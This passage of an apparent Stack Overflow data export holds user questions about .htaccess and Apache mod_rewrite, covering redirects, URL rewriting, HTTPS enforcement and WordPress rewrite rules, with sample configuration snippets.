param","body":"<p>I need to set permanent redirect from</p>\n\n<pre><code>/models_com/dpanorama/\n</code></pre>\n\n<p>to</p>\n\n<pre><code>/models_com/dpanorama/?t=cm\n</code></pre>\n\n<p>How can i do that with .htaccess file?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12528739,"title":".htaccess rewrite base url for Wordpress","body":"<p>Ok sorry if this has been asked before but I could not find a working solution. I am using wordpress multisite. This is what I am trying to achieve.</p>\n\n<p>Currently the domain <a href=\"http://mynew.com/\" rel=\"nofollow\">http://mynew.com/</a> redirects (via my hosting co.) to one of the sites on my wordpress multisite installation as follows <a href=\"http://myold.com/subsite/\" rel=\"nofollow\">http://myold.com/subsite/</a></p>\n\n<p>But I want to hide/swap the urls as follows, <a href=\"http://myold.com/subsite\" rel=\"nofollow\">http://myold.com/subsite</a> becomes <a href=\"http://mynew.com\" rel=\"nofollow\">http://mynew.com</a> and all links that follow (eg. <a href=\"http://myold.com/subsite/another-link\" rel=\"nofollow\">http://myold.com/subsite/another-link</a> becomes <a href=\"http://mynew.com/another-link\" rel=\"nofollow\">http://mynew.com/another-link</a>) without breaking.</p>\n\n<p>I tried this in my .htaccess file which rewrote the url successfully however the links did not work and returned 404 errors.</p>\n\n<pre><code>RewriteRule    ^subsite/(.+)  http://mynew.com/$1  [R,L]\n</code></pre>\n\n<p>Hope that makes sense, thanks for your help.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":43,"score":-2,"question_id":12404814,"title":"Make .htm to hide","body":"<p>Need to make the site <a href=\"http://www.acfnfranchised.com/testimonials.htm\" rel=\"nofollow\">http://www.acfnfranchised.com/testimonials.htm</a>\nto <a href=\"http://www.acfnfranchised.com/testimonials\" rel=\"nofollow\">http://www.acfnfranchised.com/testimonials</a> using .htaccess.</p>\n\n<p>Please help</p>\n"},{"tags":["java","php","android",".htaccess","jsonarray"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12528459,"title":"htaccess and its usage to allow access of a url to android user using my application","body":"<p><strong>I am a newbie for this security purpose and php files</strong></p>\n\n<p>I came to know about <strong>htaccess</strong> when i saw my files and databases are not secure.</p>\n\n<p>I am filling <code>listview</code> in Android application from <code>JsonArray</code> parsing.This <code>JsonArray</code> is coming from <strong>Server</strong> when a specific <strong>URL</strong> is clicked on android application \nThere is a <strong>php</strong> file on server and there i have echoed the result .\nNow the problem is with the data access .When I use that url on PC from browser ,It prints all the data on the browser.\nNOw how can I give access to only those user who are using my android application.\nI have heard of htaccess file but dont know how to use it and write it \nOr is there any other way to secure or get rid of direct accessing from <strong>browser</strong></p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","apache2"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":414,"score":2,"question_id":7764878,"title":"Temporary redirect to maintainence page","body":"<p>I am trying to write a rule to redirect all URLs to a temporary page so that some site updation could be done, but it ends up in an infinite loop. </p>\n\n<pre><code>  RewriteCond %{HTTP_HOST} ^(.*)mysite\\.com$\n  RewriteCond %{REQUEST_URI} !^(.*)temp$\n  RewriteRule ^(.*)$ http://www.mysite.com/temp [R=307,L]\n</code></pre>\n\n<p>How to check if it's a temp page?</p>\n"},{"tags":["string","query",".htaccess","edit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12527454,"title":".htaccess - drop/edit/remove query string parameter/flag","body":"<p>I'm trying to turn this:</p>\n\n<blockquote>\n  <p>/index.php?param1=1&amp;param2=1&amp;param3=1</p>\n</blockquote>\n\n<p>into this:</p>\n\n<blockquote>\n  <p>/index.php?param1=1&amp;param3=1</p>\n</blockquote>\n\n<p>I would have thought this would work:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} param2 [NC]\nRewriteRule ^index.php?(.*)param2=([0-9]+)(.*)$ index\\.php\\?$1&amp;$3 [R=301,QSA,L]\n</code></pre>\n\n<p>...but it and other variations are doing sod all :(</p>\n\n<p>any ideas?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12527413,"title":"removing traling slash with .htaccess","body":"<p>I have gone through different thread here that had the solution but for some reason it doesnt work for me, the solution I found to remove the trailing slash was </p>\n\n<pre><code># remove trailing slashes\nRewriteRule (.*)/$ $1 [L,R=301]\n</code></pre>\n\n<p>but it doesn't work for me, below is my .htaccess code:</p>\n\n<pre><code>Options -Multiviews\nOptions +FollowSymLinks\n\nRewriteEngine on\nRewriteBase /\n\nRewriteRule ^([^/]+)/$ index.php?slug=$1\nRewriteRule ^([^/]+)/([^/]+)$ index.php?slug=$1&amp;post=$2\n\n&lt;IfModule mod_php5.c&gt;\nphp_flag magic_quotes_gpc Off\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>please lete me know how can I fix so that instead of <code>http://domain.com/about/</code> it works like <code>http://domain.com/about</code></p>\n\n<p>regards</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12515307,"title":"htacess directory to file issue","body":"<p>I have been racking my brains for a few hours with this.</p>\n\n<p>I wish to use <strong>www.mrsmith.com/cars/</strong></p>\n\n<p>however the actual page is in a different directory based at <strong>www.mrsmith.com/pagebuilder/carinformation.php</strong></p>\n\n<p>How do I do an apache rewrite (htaccess) so that the directory www.mrsmith.com/cars/ forwards to  www.mrsmith.com/pagebuilder/carsinformation.php</p>\n\n<p>And more importantly keeps with the uri of www.mrsmith.com/cars</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["php","apache",".htaccess","header","http-status-code-301"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12525794,"title":"301 redirect - apache or php for my case?","body":"<p>I have a blog www.SITE_NAME.com which is hosted in blogger.com, Its almost 4 year old and have better search engine ranking. Most of the traffic came through Google. Now i am redesigning my site in drupal.</p>\n\n<p>So i want to redirect all older links with a 301 to new pages , Since i have nearly 700 pages , i want some logic to apply (and some case i want to redirect manually) . Which is better, using Apache or php? Or any other suggestion?</p>\n\n<p>Note :  since my old site is in blogger.com, its path is something like this <code>www.SITE_NAME.com/2007/08/music.html</code> and my new path will be like <code>www.SITE_NAME.com/DYNAMIC_PATH</code></p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12524993,"title":"htaccess - optional url parameter for redirect","body":"<p>I have a redirect for an url in my htaccess file that works just like it should:</p>\n\n<pre><code>RewriteRule (.*)/(.*)\\.html$ view.php?mode=$1&amp;id=$2 [nc]\n</code></pre>\n\n<p>However when I modify the line to try to check for the existence of the start parameter (<code>?start=1</code>) with the line below, I get a 404.</p>\n\n<pre><code>RewriteRule (.*)/(.*)\\.html(\\?start=[0-9]+)$ view.php?mode=$1&amp;id=$2&amp;start=$5 [nc]\n</code></pre>\n\n<p>How should I write this to obtain the optional <code>start</code> parameter and add it to the URI?</p>\n"},{"tags":["php",".htaccess","hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12501827,"title":"Prevent direct access to website on primary domain with multi-domain hosting","body":"<p>I recently purchased multi-domain hosting and hosted several domains on my plan. The other domains are hosting on subfolders in my primary domain. So when I go to <code>www.secondarydomain.com</code> it will display the website located at <code>www.primarydomain.com/secondarydomain</code>.</p>\n\n<p>Now what I want to do is prevent direct access when someone tries to access <code>www.primarydomain.com/secondarydomain</code> whilst keeping www.secondarydomain.com alive.</p>\n\n<p>How can I do that?</p>\n"},{"tags":["apache",".htaccess","seo","subdomain","blogger"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12453217,"title":"redirect to another domain without affecting SEO","body":"<p>I have a blog www.MY_BLOG_NAME.com which is hosted in blogger.com, Its almost 4 year old and have better search engine ranking. Most of the traffic came through Google. \nNow i am redesigning my site in drupal, but i want to keep old blog. New site in <code>www.MY_BLOG_NAME.com</code> and old in <code>old.MY_BLOG_NAME.com</code>.</p>\n\n<p>Is there anyway?</p>\n"},{"tags":[".htaccess","https","url-rewriting","url-routing"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":169,"score":3,"question_id":12380111,"title":"Access to new php files","body":"<p>I was helping a friend with a website and I created few php pages that he then copied to the root. The problem is that the htaccess file is setup in a way that I'm not able to access any of the new php files that I created but I can access all the html files. I looked into a lot of documentation for editing htaccess but I couldn't make it work. Any help is appreciated. The new pages that I have added are contact.php, show-captcha.php and thank-you.php</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)\\.htm$ $1.php [NC]\n\n#RewriteCond %{REMOTE_ADDR} !71\\.239\\.5\\.36\n#RewriteCond %{REQUEST_URI} !/maintenance.html$\n#RewriteCond %{REQUEST_URI} !/img(.*)$\n#RewriteCond %{REQUEST_URI} !/sync/$\n#RewriteRule $ /maintenance.html [R=302,L]\n\n##Errors##\nErrorDocument 400 /error.php\nErrorDocument 401 /error.php\nErrorDocument 403 /error.php\nErrorDocument 404 /error.php\nErrorDocument 500 /error.php\n\n##Redirect##\nRewriteCond %{HTTP_HOST} ^www.example.net [NC]\nRewriteRule ^(.*)$ http://example.net/$1 [L,R=301]\nRewriteCond %{SERVER_PORT} 80\nRewriteCond %{REQUEST_URI} !/$\nRewriteRule ^(.*)$ https://example.net/$1 [R,L]\n\n##Common Files##\nRewriteRule ^(.*)\\~\\57(.*)$ $1Main.php?file=$2 [NC]\nRewriteRule ^(.*)ajax\\57(.*)$ $1Main.php?ajax&amp;$2 [NC]\nRewriteRule ^(.*)sync\\57(.*)$ $1Main.php?sync&amp;$2 [NC]\nRewriteRule ^(.*)backup\\57(.*)$ $1Main.php?backup&amp;$2 [NC]\nRewriteRule ^(.*)SampleDoc(\\57)(.*[^\\57])(\\57?)$ $1index.php?count=$3 [NC]\n\n##REDIRECTS##\nRewriteRule ^(.*)menu(\\57)(.*[^\\57])(\\57)(.*[^\\57])$ $1menu.php [NC]\nRewriteRule ^(.*)menu(\\57)(.*[^\\57])(\\57?)$ $1menu.php [NC]\nRewriteRule ^(.*)menu(\\57?)$ $1menu.php [NC]\n\nRewriteRule ^(.*)checkout(\\57)(.*[^\\57])(\\57)(.*[^\\57])$ $1checkout.php [NC]\nRewriteRule ^(.*)checkout(\\57)(.*[^\\57])(\\57?)$ $1checkout.php [NC]\nRewriteRule ^(.*)checkout(\\57?)$ $1checkout.php [NC]\n\nRewriteRule ^(.*)ThankYou(\\57)(.*[^\\57])(\\57?)$ $1ThankYou.php?$3 [NC]\nRewriteRule ^(.*)ThankYou(\\57?)$ $1ThankYou.php [NC]\n\nRewriteRule ^(.*)Contact(\\57)(.*[^\\57])(\\57?)$ $1contact.php?$3 [NC]\nRewriteRule ^(.*)Contact(\\57?)$ $1contact.php [NC]\n\nRewriteRule ^(.*)account(\\57)(.*[^\\57])(\\57)(.*[^\\57])(\\57)(.*[^\\57])$ $1account.php?type=$3&amp;email=$5&amp;code=$7 [NC]\nRewriteRule ^(.*)account(\\57)(.*[^\\57])(\\57?)$ $1account.php?type=$3 [NC]\nRewriteRule ^(.*)account(\\57?)$ $1account.php [NC]\n\nRewriteRule ^(.*)catering(\\57)(.*[^\\57])(\\57)(.*[^\\57])$ $1catering.php?$3$5 [NC]\nRewriteRule ^(.*)catering(\\57)(.*[^\\57])(\\57?)$ $1catering.php?$3 [NC]\nRewriteRule ^(.*)catering(\\57?)$ $1catering.php [NC]\n\nRewriteRule ^(.*)changepassword\\57(.*[^\\57])\\57(.*[^\\57])$ $1account.php?type=changepssd&amp;email=$2&amp;code=$3 [NC]\nRewriteRule ^(.*)join(\\57)(.*[^\\57])(\\57)(.*[^\\57])$ $1account.php?type=join&amp;email=$5&amp;code=$7 [NC]\n</code></pre>\n\n<p>I tried to add contact.php but you can see it's not helping.</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":464,"score":2,"question_id":4892540,"title":"htaccess - parsing php into html","body":"<p>I recently played with a <code>.htaccess</code> file to make one server to parse PHP files. Yesterday I uploaded the same <code>.htaccess</code> file and tried to test a PHP file. But something went wrong: visiting my page the browser offers to download the the html page rather then viewing the page!</p>\n\n<p>On the server the filenames end in <code>.html</code>.</p>\n\n<p>I added the following to my <code>.htaccess</code> file:</p>\n\n<pre><code>AddType application/x-httpd-php .html\n</code></pre>\n\n<p>I tried to find the htaccess file, but once uploaded it just disappears from the root dir.\nI tried to upload other scripts I've found browsing. I even tried to search for some problem on a hosting forum. Nothing helped.\nPlease help!</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12521279,"title":"does mod_rewrite output have to exist?","body":"<p>I am trying to use mod_rewrite to generate cleaner urls.</p>\n\n<p>I have the following in my .htaccess</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\nRewriteRule ^mypage.php$ https://%{HTTP_HOST}/mypage [R=301,L]\n</code></pre>\n\n<p>The objective is to go from\n<a href=\"https://mysite.com/mypage.php\" rel=\"nofollow\">https://mysite.com/mypage.php</a> to <a href=\"https://mysite.com/mypage\" rel=\"nofollow\">https://mysite.com/mypage</a></p>\n\n<p>This gives me a 404 error. I don't actually have the directory mypage/ existing. But from my understanding, I don't need to actually have mypage for mod_rewrite to work. What am I doing wrong?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12520709,"title":"https redirect in .htaccess using mod_rewrite","body":"<p>This works awesome for me in that it redirects www.domain.com and domain.com to <a href=\"https://www.domain.com\" rel=\"nofollow\">https://www.domain.com</a></p>\n\n<p>My problem is that subdomains like sub.domain.com now are redirected there as well.  How do I keep the existing functionality but NOT affect the subdomains?</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{SERVER_PORT} 80 \nRewriteRule ^(.*)$ https://www.domain.com/$1 [R,L]\n</code></pre>\n"},{"tags":[".htaccess","url-rewriting","wildcard-subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12517953,"title":"htaccess: change address bar to remove prohibit parameter","body":"<p>I try to make subdomains with htaccess.\nit's working fine so far. I'm using the subdomain as a Get-Parameter within another script.</p>\n\n<p>However, if someone just uses this parameter, the subdomain-parameter is overwritten.</p>\n\n<p>user1.domain.com/?site=user2 will display user2.domain.com.\n(intern it is www.domain.com/index.php?site=user2)</p>\n\n<p>So, I tried to make the site redirect from, ?site=user2 to user2.domain, but everytime I use the [R]-modifier the url is changed so you can see my local folders.<br>\nRewriteBase /path/to/basefolder didn't help there either.</p>\n\n<p>Does anybody of you know how to change the addressbar, so that it is actually not /?site=user1 or /index.php?site=user1, but user1.domain.com ?<br>\nOr maybe what I did wrong?^^</p>\n\n<p>Here is my current Code:</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymlinks\n\nRewriteCond %{THE_REQUEST} ^(GET|HEAD)\\ /([^\\?]+)\\?(.*?)&amp;?site=([^&amp;\\ ]+)([^\\ ]*)\nRewriteRule ^ http://%4.domain.com/%2?%3%5 [L,R]\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_URI} !index\\.php [NC]\nRewriteCond %{REQUEST_URI} !\\.css$ [NC]\nRewriteCond %{REQUEST_URI} !\\.png$ [NC] \nRewriteRule \\.php index.php\n\nRewriteCond %{HTTP_HOST} ^(.*).domain.com$\nRewriteCond %{REQUEST_URI} !^/.*/\nRewriteRule (.*) index.php?site=%1 [NC,QSA,L]\n\n&lt;Files .htaccess&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":12,"score":1,"question_id":12520556,"title":"Linking one domain to another domain with htaccess","body":"<p>I'm stuck with htaccess redirect on this case:</p>\n\n<p>I have myapp.com domain where my main website and service runs on. My customers logs into their accounts on myapp.com and use. Now, I am going to provide one of the features on a separate domain, let's assume \"goto.com\". However, I don't want to build a separate app on goto.com. I just want to redirect all coming requests to goto.com to a php script under myapp.com but this redirection should be in the backend (masked), not a 301 redirection.</p>\n\n<p>Let me clear up:</p>\n\n<p>myapp.com - /var/www/vhosts/myapp.com/httpdocs/index.php</p>\n\n<p>goto.com --> masked redirection --> myapp.com/goto.php?$1</p>\n\n<p>How can I do this with htaccess? Any suggestions?</p>\n"},{"tags":[".htaccess","url-rewriting","liferay","virtualhost","liferay-6"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":151,"score":0,"question_id":12426047,"title":"Liferay: Removing /web/ from all community sites","body":"<p>I can't seem to figure out how to do a url rewrite so that I can remove the /web/ from all of my community sites:</p>\n\n<pre><code>domain.com/web/communitysite1/page\ndomain.com/web/communitysite2/page\ndomain.com/web/communitysite3/page\ndomain.com/web/communitysite4/page\n</code></pre>\n\n<p>and I want it to be,</p>\n\n<pre><code>domain.com/communitysite1/page\ndomain.com/communitysite2/page\ndomain.com/communitysite3/page\ndomain.com/communitysite4/page\n</code></pre>\n\n<p>Here's a <a href=\"http://www.liferay.com/community/forums/-/message_boards/message/447746\" rel=\"nofollow\" title=\"Liferay Forum\">thread</a> from Liferay, the solution there is using the virtual host; however, that's only for one of the community site for that one domain but I need the domain to be all the same for all the community sites I'm doing.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12519701,"title":"301 Unless Specific File Exists","body":"<p>I've been looking around but can't find an exact solution for this.</p>\n\n<p>I have a site that I want to redirect UNLESS they type in any existing URL.</p>\n\n<p>For example (these should worok with or without the www):</p>\n\n<pre><code>www.site.com -&gt; redirect to sub.site.com\nwww.site.com/nonexistant.php -&gt; does not so redirect to sub.site.com\nwww.site.com/index1.php -&gt; exists so show it\n</code></pre>\n\n<p>Any help is appreciated!\nThanks, Chris</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12519158,"title":"Php file executes 2 times with htaccess redirect","body":"<p>I have htaccess file which contain:</p>\n\n<pre><code>RewriteRule . index.php [L]\n</code></pre>\n\n<p>index.php:</p>\n\n<pre><code>mysql_query(\"UPDATE users SET Views = Views + 1 WHERE SteamID = '\" . mysql_real_escape_string($steamid) . \"'\", $db);\n</code></pre>\n\n<p>When I opening index.php, mysql_query executes 2 times, and column Views every time increases in 2.\nWhy?</p>\n\n<h2>added:</h2>\n\n<p>I made test.php with content: </p>\n\n<pre><code>&lt;?\n$db = mysql_connect('localhost', '****', '******');\nmysql_select_db(\"*****\", $db);\nmysql_query(\"UPDATE users SET Views = Views + 1 WHERE SteamID = '76561198037192367'\", $db);\n?&gt;\nloaded\n</code></pre>\n\n<p>this code is executing 3 times!!\nwhen I delete .htaccess everything is working properly. It's really strange...</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12518214,"title":"How to rewrite a URL like http://189.3.xxx.xxx/index.php?p=home","body":"<p>I'm trying to rewrite my URL, but without success. <code>mod_rewrite</code> is enabled. I'm using this rule:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\n  RewriteRule ^(.*)$ index.php?p=$1\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12518261,"title":".htaccess language subdomains affect other rules","body":"<p>I know that there were many questions like this but I still can't solve the problem.</p>\n\n<p>I am using following .htaccess code to change the language:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(en|us)\\.domain\\.com$\n# Create an environment variable to remember the language:\nRewriteRule (.*) - [QSA,E=LANGUAGE:%1]\n# Now check if the LANGUAGE is empty (= doesn't exist)\nRewriteCond %{ENV:LANGUAGE} ^$\n# If so, create the default language (=en):\nRewriteRule (.*) - [QSA,E=LANGUAGE:en]\n# WHATEVER THE LANGUAGE ADD IT TO THE URI:\nRewriteRule (.*) $1?language=%{ENV:LANGUAGE} [QSA]\n</code></pre>\n\n<p>This adds <code>?language=variable</code> at the end of the address.</p>\n\n<p>But for some reason the rest of the rules like this generate Internal Server Error:</p>\n\n<pre><code>RewriteRule ^([0-9]+)/([^/]+)(|/)$ code.php?id=$1&amp;title=$2 [L]\n</code></pre>\n\n<p>Simple rules (without adding variables) similar to this one work fine:</p>\n\n<pre><code>RewriteRule ^stats(|/)$ stats.php [L]\n</code></pre>\n\n<p>I hope that someone will be able to tell me where the problem is.</p>\n"},{"tags":["php","mysql",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12517843,"title":"Htaccess file modify so that users with IPs starting with particular pattern can only register but everyone can view the site","body":"<p>I have made a php mysql website where users can register. I want to modify the htaccess file (or any php code to do this) such that only the connection starting with ip x.y.z.v (where v varies) can register to the site but everyone can view the public data of the site. Most users will access the website through wireless connection as I am in a shared college network. [this is the registration url][1]</p>\n\n<pre><code>http://localhost/register.php\n</code></pre>\n\n<p>right now it is not on the servers so you can reference this url.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12516720,"title":"adding 301 redirect to wp site (with existing rules)","body":"<p>I've been asked to redirect two pages to a different url. It's working except I get a trailing  backslash at the end of the url due to the existing WP rewrite rules. I need to redirect these pages, but leave the WP rules intact for the pages that don't redirect.\nHere are the existing WP rules:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>I want to add:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\n\nRedirect 301 /*old url* http://*new url*/about.html\nRedirect 301 /*old url* http://*new url*.com/tour.html\n</code></pre>\n\n<p>When I do this it redirects to:\nnew url.com/tour.html/\nand the trailing backslash is causing the problem</p>\n\n<p>I am a total .htaccess novice.\nThanks,\nMatt</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12516459,"title":"Redirect to homepage when empty","body":"<p>I have my pages working, but when I have a situation like below:</p>\n\n<pre><code>www.mysite.com\nwww.misite.com/\nwww.miste.com/index.php\n</code></pre>\n\n<p>I need it to redirect to www.mysite.com/home/ (and show this to the user).</p>\n\n<p>Can I do that using .htaccess?</p>\n\n<p>My .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nOptions +FollowSymLinks\n\nRewriteCond %{HTTP_HOST} !^www [NC]\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_URI} !index.php\nRewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1/ [L,R=301]\n\nRewriteCond %{SCRIPT_FILENAME} !-f\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?par=$1\n\nErrorDocument 404 index.php\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12512266,"title":"Htaccess ReWrite URL with ? in duplicate URL's","body":"<p>We have moved from IIS to Apache and used the below rewrite rule to redirect www.example.co.uk/Default.aspx?pagename=About-Us to the new page url www.example.co.uk/About-Us/ </p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/Default\\.aspx$\nRewriteCond %{QUERY_STRING} ^pagename=About-Us$\nRewriteRule ^(.*)$  http://www.domain.co.uk/About-Us/ [R=301,L]\n</code></pre>\n\n<p>The problem is this rule is showing up as duplicate content in google WMT and the page is being served at both URL's... </p>\n\n<p>Can anyone spot what is wrong with this rule? </p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite","versioning"],"answer_count":2,"favorite_count":4,"up_vote_count":2,"down_vote_count":0,"view_count":751,"score":2,"question_id":5371264,"title":"Using htaccess for auto-versioning: htaccess regex Rewrite rule not picking up pattern","body":"<p>Using a suggestion in the answer to <a href=\"http://stackoverflow.com/questions/118884/what-is-an-elegant-way-to-force-browsers-to-reload-cached-css-js-files\">this question</a>, as well as <a href=\"http://derekville.net/2009/auto-versioning-javascript-and-css-files/\" rel=\"nofollow\">this article</a> which offers an almost identical solution, I've been trying to set up htaccess to handle an autoversioning rule on my js and css files.</p>\n\n<p>The reason I want to do this is that I change them quite a lot, but still want them to be cached by browsers for aggressively long periods, without having to manually enter a new version number each time they are changed.</p>\n\n<p>The method used is simple: (1) a function appends a version number to files using the date on which they were changed, on the pattern <code>[filename].[version_number].[suffix]</code>, so <code>style.css</code>, for instance, would become, say, <code>style.1300638388.css</code>; (2) using php, the versioned number is included in the stylesheet declaration for my site's pages, and this is served to client browsers who will request a fresh copy if the versioned file name differs from that they have cached; (3) a RewriteRule in .htaccess using mod_rewrite rewrites the versioned number, reverts it to its original value and serves the updated file.</p>\n\n<p>The code I'm using at each of these three stages is listed below.  I'm testing this on the stylesheet in a sandbox version of my blog on <a href=\"http://edge.donaldjenkins.net/\" rel=\"nofollow\">http://edge.donaldjenkins.net/</a></p>\n\n<h3>1. In WordPress's functions.php file</h3>\n\n<pre><code>// Allows autoversioning of css and js files\n\n/**\n *  Given a file, i.e. /css/base.css, replaces it with a string containing the\n *  file's mtime, i.e. /css/base.1221534296.css.\n *  \n *  @param $file  The file to be loaded.  Must be an absolute path (i.e.\n *                starting with slash).\n */\nfunction auto_version($file)\n{\n  if(strpos($file, '/') !== 0 || !file_exists($_SERVER['DOCUMENT_ROOT'] . $file))\n    return $file;\n\n  $mtime = filemtime($_SERVER['DOCUMENT_ROOT'] . $file);\n  return preg_replace('{\\\\.([^./]+)$}', \".$mtime.\\$1\", $file);\n}\n</code></pre>\n\n<h3>2. In the <code>&lt;head&gt;</code> portion of my blog files</h3>\n\n<pre><code>&lt;!-- Stylesheets  --&gt;\n&lt;link rel=\"stylesheet\" href=\"&lt;?=auto_version('/path/to/style.css')?&gt;\" /&gt;\n</code></pre>\n\n<h3>3. In the .htaccess file</h3>\n\n<pre><code># Allow versioning for js and css files\n\nRewriteEngine On\nRewriteRule ^(.*)\\.[\\d]+\\.(css|js)$ $1.$2 [L] # Strip out the version number\n\n# End Allow versioning for js and css files\n</code></pre>\n\n<p>With the setup described above, pages display without any formatting, and source code of the generated page shows that the stylesheet is referenced as the versioned number—which of course doesn't exist on the server.</p>\n\n<p>This would suggest that the function is correctly changing the name of the stylesheet, but that for some reason the regex pattern in the RewriteRule in .htaccess isn't catching the file name and rewriting it.  In fact, it doesn't even catch it if I change it to <code>^style.1300638388.css$ style.css [L]</code>.</p>\n\n<p>I've tried several patterns, to no avail, but must be missing something pretty basic.</p>\n\n<p><code>mod_rewrite</code> is  on on the server and runs without issues for several other RewriteRule instances.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>The only other RewriteRule in the <code>.htaccess</code>file is the standard WordPress pretty url rewrite rule.  I doubt it interferes with this one, although obviously I can't easily test without the WordPress rule as this would completely break page generation:</p>\n\n<pre><code># BEGIN WordPress\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p><strong>UPDATE 2: SOLVED</strong></p>\n\n<p>CharlesLeaf in a comment below pointed out that as the WordPress rule was before the versioning one, the latter would not be carried out.  This actually was the reason and allowed me answer the question by grouping the two rules, as follows:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n# Allow versioning for js and css files\n\nRewriteEngine On\nRewriteRule ^(.*)\\.[\\d]+\\.(css|js)$ $1.$2 [L] # Strip out the version number\n\n# End Allow versioning for js and css files\n\n# BEGIN WordPress\n\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php\n\n# END WordPress\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12510978,"title":"redirect rule with htaccess","body":"<p>I 'm searching a way to redirect</p>\n\n<p><code>/threads/2486-dell-inspiron-545-grafikkarte-austauschen/3page</code> 